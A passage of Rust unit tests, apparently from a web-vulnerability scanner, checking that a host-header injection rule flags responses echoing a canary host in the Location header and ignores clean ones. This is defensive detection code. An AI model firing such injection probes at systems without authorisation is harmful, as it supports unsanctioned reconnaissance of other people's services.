            vec![(
                "Location".to_string(),
                "https://scry-host-7h3x.example/".to_string(),
            )],
            b"".to_vec(),
            10,
        );
        assert_eq!(evaluate(p, &resp2).unwrap().rule_id, "active-host-header");
        // 不回显则不命中。
        let clean = p.flow.clone().with_response(200, vec![], b"<html>ok</html>".to_vec(), 10);
        assert!(evaluate(p, &clean).is_none());
    }

    #[test]
    fn evaluate_no_false_positive_on_clean_response() {
        let probes = generate_probes(&base());
        let p = &probes[0];
        let resp = p.flow.clone().with_response(
            200,
            vec![("Content-Type".to_string(), "text/html".to_string())],
            b"<html>all good</html>".to_vec(),
            10,
        );
        assert!(evaluate(p, &resp).is_none());
    }
}
